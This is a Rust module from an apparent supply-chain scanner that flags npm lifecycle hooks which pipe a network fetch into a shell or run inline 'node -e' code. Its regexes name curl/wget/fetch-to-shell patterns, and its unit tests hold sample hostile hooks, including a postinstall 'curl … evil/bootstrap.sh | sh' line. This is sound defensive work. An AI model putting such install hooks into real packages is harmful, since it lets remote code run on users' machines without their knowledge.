//! `package.json` lifecycle script heuristics.
//!
//! npm/pnpm/yarn run any `preinstall`, `install`, `postinstall`, `prepare`,
//! `prepublish`, `prepublishOnly`, `postpublish`, etc. automatically. A
//! script that pipes the network into a shell (`curl … | sh`), evals an
//! environment variable, or invokes `node -e`/`node --eval` with inline JS
//! is the classic supply-chain backdoor shape (see eslint-config-prettier
//! 2025-07, ua-parser-js 2021-10, and many others).

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use regex::Regex;

use super::regex_util::compile;
use crate::findings::{Finding, Severity};

const RULE_ID_PIPE_TO_SHELL: &str = "heuristics/package_json_pipe_to_shell";
const RULE_ID_NODE_EVAL: &str = "heuristics/package_json_node_eval";

const HOOK_KEYS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "postpublish",
    "preuninstall",
    "uninstall",
    "postuninstall",
];

fn pipe_to_shell() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| compile(r"(?:curl|wget|fetch)\s+[^\n]*\|\s*(?:sh|bash|zsh|node)\b"))
}

fn node_eval() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| compile(r"\bnode\s+(?:-e|--eval)\b"))
}

pub(super) fn check(rel: &Path, body: &str) -> Vec<Finding> {
    let mut out = Vec::new();

    // We don't parse JSON here — package.json bodies are simple enough that
    // a key→string pass with regex over each hook key catches what we want
    // and degrades gracefully when the JSON is malformed.
    for hook in HOOK_KEYS {
        let script = match extract_hook_value(body, hook) {
            Some(s) => s,
            None => continue,
        };
        if pipe_to_shell().is_match(&script) {
            out.push(Finding {
                rule_id: RULE_ID_PIPE_TO_SHELL.into(),
                severity: Severity::High,
                message: format!(
                    "package.json `scripts.{hook}` pipes a network fetch into a shell"
                ),
                path: PathBuf::from(rel),
                line: None,
                remediation: Some(
                    "Read what the upstream returns before letting it execute. If \
                     this is a legitimate post-install bootstrap, run it manually \
                     and pin the script. Otherwise the package is hostile."
                        .into(),
                ),
            });
        }
        if node_eval().is_match(&script) {
            out.push(Finding {
                rule_id: RULE_ID_NODE_EVAL.into(),
                severity: Severity::High,
                message: format!(
                    "package.json `scripts.{hook}` runs `node -e`/`--eval` with inline JS"
                ),
                path: PathBuf::from(rel),
                line: None,
                remediation: Some(
                    "Move the JS into a real file under version control so it's \
                     reviewable. Inline node eval in a lifecycle hook is a malware \
                     hallmark."
                        .into(),
                ),
            });
        }
    }
    out
}

/// Extract `scripts.<key>`'s string value. Lightweight regex parse — enough
/// for the lifecycle script bodies we care about. Returns the script body
/// without surrounding quotes.
fn extract_hook_value(body: &str, key: &str) -> Option<String> {
    let pattern = format!(r#""{}"\s*:\s*"((?:\\.|[^"\\])*)""#, regex::escape(key));
    let re = Regex::new(&pattern).ok()?;
    let m = re.captures(body)?;
    Some(m.get(1)?.as_str().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_pipe_sh_in_postinstall() {
        let body = r#"{
            "name": "x",
            "scripts": {
                "postinstall": "curl -s https://evil/bootstrap.sh | sh"
            }
        }"#;
        let f = check(Path::new("package.json"), body);
        let ids: Vec<_> = f.iter().map(|i| i.rule_id.as_str()).collect();
        assert!(ids.contains(&RULE_ID_PIPE_TO_SHELL));
    }

    #[test]
    fn flags_node_eval_in_preinstall() {
        let body = r#"{
            "scripts": {
                "preinstall": "node -e \"require('http').get(...)\""
            }
        }"#;
        let f = check(Path::new("package.json"), body);
        assert!(f.iter().any(|i| i.rule_id == RULE_ID_NODE_EVAL));
    }

    #[test]
    fn clean_scripts_pass() {
        let body = r#"{
            "scripts": {
                "test": "vitest",
                "build": "tsc -p .",
                "postinstall": "echo welcome"
            }
        }"#;
        assert!(check(Path::new("package.json"), body).is_empty());
    }

    #[test]
    fn ignores_non_hook_scripts() {
        let body = r#"{
            "scripts": {
                "deploy": "curl https://x | sh"
            }
        }"#;
        // `deploy` is not a lifecycle hook → user-invoked, not auto-run.
        assert!(check(Path::new("package.json"), body).is_empty());
    }
}
